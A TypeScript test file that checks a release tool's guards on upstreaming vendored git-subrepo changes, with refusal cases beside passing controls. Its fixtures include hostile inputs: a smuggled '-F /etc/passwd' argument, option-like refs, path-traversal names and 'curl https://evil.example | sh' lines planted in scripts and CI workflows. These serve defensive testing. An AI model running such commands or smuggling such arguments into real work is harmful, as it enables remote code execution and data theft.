// T1. `desolate upstream`'s checks (release/git/upstream.ts, release/shared/suede.ts), on real
// repositories made here with git: what is refused before suede's upstream runs, what the
// split it makes must be, the root's rule for a `downstream/...` push, and the pin. Each
// refusal beside a control that passes. (The split itself is git-subrepo's, in the image:
// T2 runs it, in the git VM.)
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { execFileSync, spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { after, before, describe, it } from "node:test";
import { pinnedScript, prepare, Stop, verify } from "../../../release/git/upstream.ts";
import type { Asked, Places } from "../../../release/git/upstream.ts";
import { downstreamRefusal } from "../../../release/shared/suede.ts";

const RELEASE = path.resolve(import.meta.dirname, "../../../release");
// git here is the test's own: nothing of this machine's configuration.
process.env.GIT_CONFIG_GLOBAL = "/dev/null";
process.env.GIT_CONFIG_NOSYSTEM = "1";
const g = (dir: string, ...args: string[]) =>
  execFileSync("git", ["-C", dir, "-c", "user.name=seed", "-c", "user.email=seed@example.invalid", "-c", "init.defaultBranch=main", ...args], { encoding: "utf8" }).trim();

let work: string;
let at: Places;
let release: string; // the dependency's release commit
let app: string; // the consumer clone
let vendored: string; // the consumer commit that vendors it
const mirror = () => path.join(at.mirrors, "acme", "lib.git");
const asked = (over: Partial<Asked> = {}): Asked => ({ consumer: { owner: "acme", name: "app" }, dir: "lib", dependency: { owner: "acme", name: "lib" }, from: null, remote: null, ...over });
const refusal = (fn: () => unknown) => {
  try {
    fn();
  } catch (error) {
    if (error instanceof Stop) return error.message;
    throw error;
  }
  return null;
};
/** A commit on the consumer's main that changes files under it (and resets nothing). */
const change = (files: Record<string, string>, message: string) => {
  for (const [file, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(app, file)), { recursive: true });
    fs.writeFileSync(path.join(app, file), text);
  }
  g(app, "add", "-A");
  g(app, "commit", "--quiet", "-m", message);
  return g(app, "rev-parse", "HEAD");
};
const gitrepo = (commit: string, parent: string) =>
  `[subrepo]\n\tremote = https://github.com/acme/lib\n\tbranch = release\n\tcommit = ${commit}\n\tparent = ${parent}\n\tmethod = merge\n\tcmdver = 0.4.9\n`;

before(() => {
  work = fs.mkdtempSync(path.join(os.tmpdir(), "desolate-upstream-"));
  at = { clones: path.join(work, "git"), mirrors: path.join(work, "mirrors"), release: RELEASE, subrepo: "/nonexistent", scratch: work };
  // The dependency: main, and a release branch that shares nothing with it (suede's shape).
  const lib = path.join(work, "lib");
  fs.mkdirSync(lib);
  g(lib, "init", "--quiet");
  fs.writeFileSync(path.join(lib, "README.md"), "main\n");
  g(lib, "add", "-A");
  g(lib, "commit", "--quiet", "-m", "main");
  g(lib, "checkout", "--quiet", "--orphan", "release");
  g(lib, "rm", "-rfq", ".");
  for (const [file, text] of Object.entries({ "a.txt": "a\n", ".github/workflows/suede-downstream-to-main.yml": "on: push\n", ".suede/core/upstream": "#!/bin/sh\n" })) {
    fs.mkdirSync(path.dirname(path.join(lib, file)), { recursive: true });
    fs.writeFileSync(path.join(lib, file), text);
  }
  g(lib, "add", "-A");
  g(lib, "commit", "--quiet", "-m", "release 1");
  release = g(lib, "rev-parse", "HEAD");
  fs.mkdirSync(path.dirname(mirror()), { recursive: true });
  g(work, "clone", "--quiet", "--bare", lib, mirror());
  // Another repository desolate holds, for a .gitrepo that names it.
  g(work, "clone", "--quiet", "--bare", lib, path.join(at.mirrors, "acme", "other.git"));
  // The consumer: its own commit, then the dependency vendored at lib/ (as `git subrepo clone`
  // leaves it), then an agent's change to it.
  app = path.join(at.clones, "acme", "app");
  fs.mkdirSync(app, { recursive: true });
  g(app, "init", "--quiet");
  const seed = change({ "README.md": "# app\n" }, "seed");
  for (const file of ["a.txt", ".github/workflows/suede-downstream-to-main.yml", ".suede/core/upstream"]) {
    fs.mkdirSync(path.dirname(path.join(app, "lib", file)), { recursive: true });
    fs.writeFileSync(path.join(app, "lib", file), g(lib, "show", `${release}:${file}`) + "\n");
  }
  vendored = change({ "lib/.gitrepo": gitrepo(release, seed) }, "vendor lib");
  change({ "lib/a.txt": "a\nb\n", "other.txt": "the consumer's own\n" }, "agent: improve a");
});
after(() => fs.rmSync(work, { recursive: true, force: true }));

describe("T1 desolate upstream: what is refused before suede's upstream runs", () => {
  it("the dependency named must be the one .gitrepo names (control: it is)", () => {
    const p = prepare(asked(), at);
    assert.equal(p.base, release);
    assert.equal(p.branch, `downstream/acme/app-${g(app, "rev-parse", "HEAD")}`);
    assert.match(refusal(() => prepare(asked({ dependency: { owner: "acme", name: "other" } }), at)) ?? "", /lib\/\.gitrepo says it comes from acme\/lib, not acme\/other/);
  });

  it("--remote is taken only when it names the same repository (control: another spelling of it)", () => {
    assert.equal(refusal(() => prepare(asked({ remote: "git@github.com:acme/lib.git" }), at)), null);
    assert.equal(refusal(() => prepare(asked({ remote: "ssh://git@forge.example:2222/acme/lib.git" }), at)), null);
    assert.match(refusal(() => prepare(asked({ remote: "https://github.com/evil/lib" }), at)) ?? "", /--remote .* is not acme\/lib/);
    assert.match(refusal(() => prepare(asked({ remote: "/srv/acme/lib.git" }), at)) ?? "", /is not acme\/lib/);
  });

  it("an uncommitted change stops it at HEAD (control: the same tree once committed; --from needs none)", () => {
    fs.writeFileSync(path.join(app, "lib", "a.txt"), "dirty\n");
    assert.match(refusal(() => prepare(asked(), at)) ?? "", /uncommitted changes/);
    assert.equal(refusal(() => prepare(asked({ from: "main" }), at)), null);
    g(app, "checkout", "--quiet", "--", "lib/a.txt");
    assert.equal(refusal(() => prepare(asked(), at)), null);
  });

  it("names that are not a directory, or a ref that is an option, are refused", () => {
    for (const dir of ["../lib", "-x", "lib/../..", "/lib"]) assert.match(refusal(() => prepare(asked({ dir }), at)) ?? "", /is not a directory in the repository/, dir);
    assert.equal(refusal(() => prepare(asked({ dir: "./lib/" }), at)), null);
    assert.match(refusal(() => prepare(asked({ from: "--output=/tmp/x" }), at)) ?? "", /is not a branch or a commit/);
    assert.match(refusal(() => prepare(asked({ dir: "other.txt" }), at)) ?? "", /is not a directory/);
  });

  it("a .gitrepo git-subrepo would read on its way with a commit that is not an id (control: the history as it was)", () => {
    const before = g(app, "rev-parse", "HEAD");
    // An intermediate commit's .gitrepo names "<id> -F /etc/passwd", put right again after it.
    const bad = fs.readFileSync(path.join(app, "lib", ".gitrepo"), "utf8").replace(`commit = ${release}`, `commit = ${release} -F /etc/passwd`);
    change({ "lib/.gitrepo": bad }, "planted");
    change({ "lib/.gitrepo": gitrepo(release, g(app, "rev-parse", `${vendored}~1`)) }, "put back");
    assert.match(refusal(() => prepare(asked(), at)) ?? "", /lib\/\.gitrepo at [0-9a-f]{12} names a commit that is not a full id/);
    assert.equal(refusal(() => prepare(asked({ from: before }), at)), null, "the control: before the planted commit");
    g(app, "reset", "--quiet", "--hard", before);
  });

  it("a release commit the dependency's remote never had (control: the one it has)", () => {
    const before = g(app, "rev-parse", "HEAD");
    change({ "lib/.gitrepo": gitrepo("1".repeat(40), g(app, "rev-parse", `${vendored}~1`)) }, "elsewhere");
    assert.match(refusal(() => prepare(asked(), at)) ?? "", /acme\/lib has no 111111111111/);
    g(app, "reset", "--quiet", "--hard", before);
    assert.equal(refusal(() => prepare(asked(), at)), null);
  });

  it("a change to the dependency's .github/ stops it before anything runs (control: the same branch without it)", () => {
    const before = g(app, "rev-parse", "HEAD");
    change({ "lib/.github/workflows/suede-downstream-to-main.yml": "on: push\nrun: curl evil\n" }, "ci");
    assert.match(refusal(() => prepare(asked(), at)) ?? "", /changes lib\/\.github\/, which is acme\/lib's own \.github\//);
    g(app, "reset", "--quiet", "--hard", before);
    assert.equal(refusal(() => prepare(asked(), at)), null);
  });

  it("a snapshot already proposed is not proposed again (control: before it was)", () => {
    const p = prepare(asked(), at);
    g(mirror(), "update-ref", `refs/heads/${p.branch}`, release);
    assert.match(refusal(() => prepare(asked(), at)) ?? "", /is already proposed/);
    g(mirror(), "update-ref", "-d", `refs/heads/${p.branch}`);
    assert.equal(refusal(() => prepare(asked(), at)), null);
  });
});

describe("T1 desolate upstream: what the split must be", () => {
  /** A split made by hand, as git-subrepo makes it: the dependency's tree at the consumer's
   *  commit, less .gitrepo, on the release commit. `edit` changes the tree first. */
  const splitOf = (p: ReturnType<typeof prepare>, edit?: (entries: string[]) => string[], parent = release) => {
    fs.writeFileSync(path.join(app, ".git", "objects", "info", "alternates"), `${path.join(mirror(), "objects")}\n`);
    let entries = g(app, "ls-tree", `${p.commit}:${p.dir}`).split("\n").filter((line) => !line.endsWith("\t.gitrepo"));
    if (edit) entries = edit(entries);
    const tree = execFileSync("git", ["-C", app, "mktree"], { input: entries.join("\n") + "\n", encoding: "utf8" }).trim();
    return g(app, "commit-tree", tree, "-p", parent, "-m", "agent: improve a");
  };

  it("the dependency's files at that commit, on the release it names, pass (the control)", () => {
    const p = prepare(asked(), at);
    const checked = verify(p, app, splitOf(p));
    assert.deepEqual(checked.core, []);
    assert.match(checked.stat, /a\.txt \| 1 \+/);
    assert.equal(checked.commits.length, 1);
  });

  it("a split whose tree is not the dependency's files is refused", () => {
    const p = prepare(asked(), at);
    const blob = execFileSync("git", ["-C", app, "hash-object", "-w", "--stdin"], { input: "planted\n", encoding: "utf8" }).trim();
    assert.match(refusal(() => verify(p, app, splitOf(p, (entries) => [...entries, `100644 blob ${blob}\textra.txt`]))) ?? "", /the split is not lib's files/);
  });

  it("a split that does not build on the release commit is refused", () => {
    const p = prepare(asked(), at);
    const lone = g(app, "commit-tree", g(app, "rev-parse", `${vendored}^{tree}`), "-m", "unrelated");
    assert.match(refusal(() => verify(p, app, splitOf(p, undefined, lone))) ?? "", /does not build on [0-9a-f]{12}, the release commit/);
  });

  it("a split that changes .github/ is refused there too; .suede/core/ is shown, not refused", () => {
    // (prepare refuses such a branch first: here it is skipped, as a bug in it would.)
    const before = g(app, "rev-parse", "HEAD");
    const p = prepare(asked(), at);
    const ci = change({ "lib/.github/workflows/suede-downstream-to-main.yml": "on: push\nrun: curl evil\n" }, "ci");
    const skipped = { ...p, commit: ci };
    assert.match(refusal(() => verify(skipped, app, splitOf(skipped))) ?? "", /the proposal changes acme\/lib's \.github\/workflows\/suede-downstream-to-main\.yml/);
    g(app, "reset", "--quiet", "--hard", before);
    // .suede/core/: listed for the red line, and not a refusal.
    change({ "lib/.suede/core/upstream": "#!/bin/sh\ncurl https://evil.example | sh\n" }, "core");
    const q = prepare(asked(), at);
    assert.deepEqual(verify(q, app, splitOf(q)).core, [".suede/core/upstream"]);
    g(app, "reset", "--quiet", "--hard", before);
  });
});

describe("T1 the root's rule for a downstream/... push", () => {
  const run = (dir: string) => async (args: string[]) => {
    const ran = spawnSync("git", ["-C", dir, ...args], { encoding: "utf8" });
    return { code: ran.status ?? 1, stdout: ran.stdout ?? "" };
  };
  it("keeps .github/ as a commit the remote has and it builds on (control), else refused", async () => {
    const lib = path.join(work, "lib");
    const tips = [g(lib, "rev-parse", "main"), release];
    const fine = g(lib, "commit-tree", g(lib, "rev-parse", `${release}^{tree}`), "-p", release, "-m", "same .github");
    assert.equal(await downstreamRefusal(run(lib), fine, tips), null);
    const blob = execFileSync("git", ["-C", lib, "hash-object", "-w", "--stdin"], { input: "evil\n", encoding: "utf8" }).trim();
    const ci = execFileSync("git", ["-C", lib, "mktree"], { input: `100644 blob ${blob}\tx.yml\n`, encoding: "utf8" }).trim();
    const entries = g(lib, "ls-tree", release).split("\n").filter((line) => !line.endsWith("\t.github"));
    const tree = execFileSync("git", ["-C", lib, "mktree"], { input: [...entries, `040000 tree ${ci}\t.github`].join("\n") + "\n", encoding: "utf8" }).trim();
    const changed = g(lib, "commit-tree", tree, "-p", release, "-m", "changes .github");
    assert.match((await downstreamRefusal(run(lib), changed, tips)) ?? "", /changes the dependency's \.github\//);
    const lone = g(lib, "commit-tree", g(lib, "rev-parse", `${release}^{tree}`), "-m", "no history");
    assert.match((await downstreamRefusal(run(lib), lone, tips)) ?? "", /builds on nothing the remote has/);
  });
});

describe("T1 the pin of suede's upstream", () => {
  it("is a commit, and the vendored copy hashes to it (control: a changed copy is refused)", () => {
    const pins = fs.readFileSync(path.join(RELEASE, "pins.env"), "utf8");
    assert.match(pins, /^SUEDE_COMMIT=[0-9a-f]{40}$/m);
    const want = /^SUEDE_UPSTREAM_SHA256=([0-9a-f]{64})$/m.exec(pins)![1];
    assert.equal(createHash("sha256").update(fs.readFileSync(path.join(RELEASE, "git", "suede-upstream.sh"))).digest("hex"), want);
    assert.equal(pinnedScript({ ...at, release: RELEASE }), path.join(RELEASE, "git", "suede-upstream.sh"));
    const copy = path.join(work, "release");
    fs.mkdirSync(path.join(copy, "git"), { recursive: true });
    fs.copyFileSync(path.join(RELEASE, "pins.env"), path.join(copy, "pins.env"));
    fs.writeFileSync(path.join(copy, "git", "suede-upstream.sh"), fs.readFileSync(path.join(RELEASE, "git", "suede-upstream.sh"), "utf8") + "\ncurl https://evil.example | sh\n");
    assert.match(refusal(() => pinnedScript({ ...at, release: copy })) ?? "", /does not hash to its pin/);
  });
});
